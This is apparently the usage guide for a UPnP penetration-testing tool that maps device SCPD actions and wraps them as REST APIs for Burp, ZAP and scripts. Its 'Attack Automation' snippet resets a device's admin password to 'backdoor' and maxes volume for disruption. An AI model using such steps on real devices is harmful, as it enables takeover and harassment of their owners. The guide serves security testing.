# Enhanced UPnP Profiles: Complete System Guide

## Overview

The Enhanced UPnP Profiles system transforms basic UPnP device discovery into comprehensive penetration testing intelligence. This guide explains the complete workflow from device discovery to executable REST APIs.

## 🎯 **What Problem Does This Solve?**

### Traditional UPnP Analysis Problems:
- **Limited Discovery**: Basic UPnP discovery only finds devices, not their capabilities
- **Manual SOAP Analysis**: Requires tedious manual parsing of SCPD documents  
- **No Action Inventory**: No systematic catalog of all device functions
- **Tool Integration Issues**: UPnP doesn't work with modern security tools
- **Time-Intensive**: Manual analysis of each device takes hours

### Our Solution:
- **🔍 Automated SCPD Analysis**: Parse ALL service descriptions automatically
- **📋 Complete Action Inventory**: Catalog every function with arguments and data types
- **🎯 Capability Classification**: Categorize actions by security relevance
- **🚀 REST API Generation**: Convert everything to modern HTTP endpoints
- **⚡ Rapid Assessment**: Analyze entire networks in minutes

## 📊 **System Architecture**

```
Network Discovery → Enhanced Profiles → REST APIs → Security Testing
      ↓                    ↓              ↓             ↓
   Find Devices    →  Analyze Actions  →  HTTP Endpoints → Burp/ZAP/Scripts
```

## 🔧 **Core Components**

### 1. Enhanced Profile Generator
**Purpose**: Convert UPnP device information into comprehensive profiles with complete SCPD analysis.

**What it does**:
- Fetches and parses ALL SCPD (Service Control Point Description) documents
- Extracts every available action with complete argument specifications
- Analyzes state variables and data type constraints
- Categorizes actions by security relevance (media, volume, security, configuration)
- Generates detailed profiles with metadata

**Input**: Basic UPnP device discovery results
**Output**: Enhanced JSON profiles with complete action inventories

### 2. API Generator  
**Purpose**: Convert enhanced profiles into working REST APIs for modern security tool integration.

**What it does**:
- Transforms UPnP SOAP actions into HTTP REST endpoints
- Generates FastAPI applications with automatic documentation
- Creates request validation based on SCPD data types
- Provides modern API interfaces for 1990s protocols
- Enables integration with Burp Suite, OWASP ZAP, and scripting

**Input**: Enhanced JSON profiles
**Output**: Working FastAPI applications with full documentation

## 🚀 **Complete Workflow**

### Phase 1: Network Discovery
```bash
# Discover all UPnP devices on network
upnp-cli enhanced-profile mass --save-profiles --individual-files
```

**What happens**:
1. SSDP discovery finds all UPnP devices
2. Device descriptions are fetched and parsed
3. ALL SCPD documents are retrieved and analyzed
4. Complete action inventories are built
5. Enhanced profiles are generated and saved

### Phase 2: Profile Analysis
**Generated files**:
- `enhanced_profiles_TIMESTAMP.json` - Master file with all profiles
- `enhanced_profiles_TIMESTAMP_individual/` - Individual device profiles
- `DeviceName_XXXactions.json` - Per-device files with action counts

**Profile contents**:
```json
{
  "name": "Device Name",
  "metadata": {
    "generated_at": "2025-06-05 20:07:35",
    "scpd_analysis": {
      "services_analyzed": 16,
      "total_actions": 196,
      "parsing_errors": []
    }
  },
  "upnp": {
    "action_inventory": {
      "service_name": {
        "ActionName": {
          "complexity": "🟢 Easy",
          "category": "security",
          "arguments_in": [...],
          "arguments_out": [...],
          "description": "Action description"
        }
      }
    },
    "state_variables": {...},
    "services": {...}
  },
  "capabilities": {
    "media_control_actions": 23,
    "volume_control_actions": 20,
    "information_actions": 51,
    "security_actions": 1,
    "total_actions": 196
  }
}
```

### Phase 3: REST API Generation
```bash
# Generate REST API from enhanced profile (when implemented)
upnp-cli generate-api enhanced_profiles/Device_Profile.json --output-dir apis/
```

**What happens**:
1. Profile is parsed for action inventory
2. FastAPI application is generated with endpoints for each action
3. Request validation is created based on SCPD data types
4. Interactive documentation is auto-generated
5. Startup scripts and requirements are created

## 🎯 **Penetration Testing Value**

### Security Intelligence Gathering
**Enhanced profiles provide**:
- Complete attack surface mapping (all available actions)
- Security-relevant action identification
- Complexity assessment for exploit planning
- Argument specifications for payload crafting

### Modern Tool Integration
**REST APIs enable**:
- **Burp Suite**: Intercept and modify all device actions as HTTP requests
- **OWASP ZAP**: Automatic security scanning of all endpoints  
- **Python Scripts**: Simple automation with `requests` library
- **Postman**: Create and share attack collections

### Attack Automation
```python
# Example: Automated device compromise
import requests

api = "http://localhost:8000"

# Initialize connection
requests.post(f"{api}/init?host=192.168.1.100&port=1400")

# Execute security action
requests.post(f"{api}/systemproperties/edit_account_password", 
             json={"AccountType": "admin", "NewAccountPassword": "backdoor"})

# Volume manipulation for disruption
requests.post(f"{api}/renderingcontrol/set_volume", json={"DesiredVolume": "100"})
```

## 📋 **Action Categories**

### 🎵 Media Control Actions
- **Purpose**: Control playback, streaming, content selection
- **Examples**: Play, Pause, Stop, SetAVTransportURI
- **Penetration Testing Value**: Service disruption, unauthorized content injection
- **Complexity**: Usually 🟢 Easy to 🟡 Medium

### 🔊 Volume Control Actions  
- **Purpose**: Audio level and mute control
- **Examples**: SetVolume, GetVolume, SetMute
- **Penetration Testing Value**: Disruption attacks, social engineering assistance
- **Complexity**: Usually 🟢 Easy

### ℹ️ Information Actions
- **Purpose**: Device status, configuration retrieval
- **Examples**: GetDeviceStatus, GetSystemInfo, GetTransportInfo
- **Penetration Testing Value**: Reconnaissance, device fingerprinting
- **Complexity**: Usually 🟢 Easy

### ⚙️ Configuration Actions
- **Purpose**: Device settings, network configuration
- **Examples**: SetConnectionSettings, ConfigureNetwork
- **Penetration Testing Value**: Persistence, lateral movement setup
- **Complexity**: Usually 🟡 Medium to 🔴 Complex

### 🔒 Security Actions
- **Purpose**: Authentication, access control, credentials
- **Examples**: EditAccountPasswordX, SetSecuritySettings
- **Penetration Testing Value**: **CRITICAL** - Direct credential manipulation
- **Complexity**: Usually 🔴 Complex

## 🔍 **Real-World Examples**

### Example 1: Sonos Device Analysis
```bash
# Discovery found Sonos Port with 196 total actions
upnp-cli enhanced-profile mass --individual-files

# Results:
# - 23 media control actions (disruption potential)
# - 20 volume control actions (harassment potential)  
# - 51 information actions (reconnaissance value)
# - 52 configuration actions (persistence opportunities)
# - 1 security action (EditAccountPasswordX - CRITICAL)
```

### Example 2: Samsung TV Analysis  
```bash
# Enhanced profile reveals:
# - IRCC service for remote control simulation
# - ScalarWebAPI for advanced TV functions
# - Potential for unauthorized channel control
# - Screen manipulation capabilities
```

### Example 3: Router/Gateway Analysis
```bash
# Enhanced profile shows:
# - Layer3Forwarding actions (routing manipulation)
# - WANCommonInterfaceConfig (network configuration)
# - Potential for traffic redirection
# - Network topology modification
```

## 🛠️ **Command Reference**

### Enhanced Profile Generation
```bash
# Generate profiles for all network devices
upnp-cli enhanced-profile mass --save-profiles --individual-files

# Generate profile for single device  
upnp-cli enhanced-profile single --host 192.168.1.100 --save-profile

# Minimal output (less verbose)
upnp-cli enhanced-profile mass --minimal

# JSON output for automation
upnp-cli enhanced-profile mass --json
```

### Profile Analysis
```bash
# View profile contents
cat enhanced_profiles/Device_Profile.json | jq '.capabilities'

# List security actions
cat enhanced_profiles/Device_Profile.json | jq '.upnp.action_inventory[] | select(.category == "security")'

# Count total actions
cat enhanced_profiles/Device_Profile.json | jq '.capabilities.total_actions'
```

## 📁 **File Structure**

```
enhanced_profiles/
├── enhanced_profiles_20250605_200735.json          # Master profiles file
└── enhanced_profiles_20250605_200735_individual/   # Individual device profiles
    ├── Sonos_Port_196actions.json
    ├── Samsung_TV_34actions.json
    └── Router_Gateway_8actions.json

generated_apis/                                     # Generated REST APIs
├── sonos_port/
│   ├── sonos_port_api.py                          # FastAPI application
│   ├── requirements.txt                           # Dependencies
│   ├── start_sonos_port_api.sh                    # Startup script
│   └── sonos_port_api_docs.md                     # Documentation
```

## ⚠️ **Security Considerations**

### Profile Security
- Enhanced profiles contain **complete device attack surface maps**
- Profiles should be treated as **sensitive reconnaissance data**
- Store profiles securely and limit access appropriately

### API Security  
- Generated APIs provide **direct device control capabilities**
- APIs should only be run in **controlled testing environments**
- **Never expose generated APIs to untrusted networks**

### Legal Compliance
- Only analyze devices you **own or have explicit permission** to test
- Enhanced profiles enable powerful attacks - **use responsibly**
- Follow all applicable **penetration testing guidelines and laws**

## 🚀 **Advanced Usage**

### Integration with Security Frameworks
```python
# Metasploit integration example
# Use enhanced profiles to identify target capabilities
# Generate custom exploits based on available actions

# OWASP ZAP integration
# Import generated OpenAPI specs for automatic scanning
# Fuzz all endpoints systematically

# Burp Suite integration  
# Use generated APIs as proxy targets
# Modify requests in real-time during testing
```

### Automated Analysis Pipelines
```bash
#!/bin/bash
# Automated UPnP assessment pipeline

# 1. Network discovery and profiling
upnp-cli enhanced-profile mass --save-profiles --json > results.json

# 2. Generate APIs for all devices
for profile in enhanced_profiles/individual/*.json; do
    upnp-cli generate-api "$profile" --output-dir "apis/"
done

# 3. Launch APIs and begin automated testing
# ... security testing automation ...
```

## 📚 **Further Reading**

- [UPnP Specification](http://upnp.org/specs/) - Official UPnP standards
- [SCPD Documentation](http://upnp.org/specs/arch/UPnP-arch-DeviceArchitecture-v1.0.pdf) - Service description format
- [FastAPI Documentation](https://fastapi.tiangolo.com/) - Generated API framework
- [Penetration Testing Methodology](https://owasp.org/www-project-web-security-testing-guide/) - Security testing best practices 